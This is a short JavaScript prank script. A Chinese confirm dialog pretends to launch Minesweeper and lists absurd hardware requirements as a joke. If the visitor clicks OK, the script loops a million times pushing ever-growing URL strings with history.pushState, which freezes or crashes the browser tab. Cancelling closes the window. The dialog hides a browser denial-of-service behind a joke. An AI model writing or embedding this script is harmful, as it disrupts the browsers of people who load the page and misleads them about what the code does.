if (
    confirm(
        "您确认要打开 扫雷 吗？\n\n" +
        "最低配置：\n" +
        "CPU: AMD Ryzen Threadripper 1950X\n" +
        "显卡: GeForce GTX 1080 Ti\n" +
        "内存: 128GB\n\n" +
        "推荐配置:\n" +
        "CPU：神威·太湖之光\n" +
        "显卡：六十四路 NVIDIA TITAN Xp\n" +
        "内存：6144GB"
    ) == 1) {
    var total = "";
    for (var i = 0; i < 1000000; i++) {
        total = total + i.toString();
        history.pushState(0, 0, total);
    }
} else {
    window.close();
}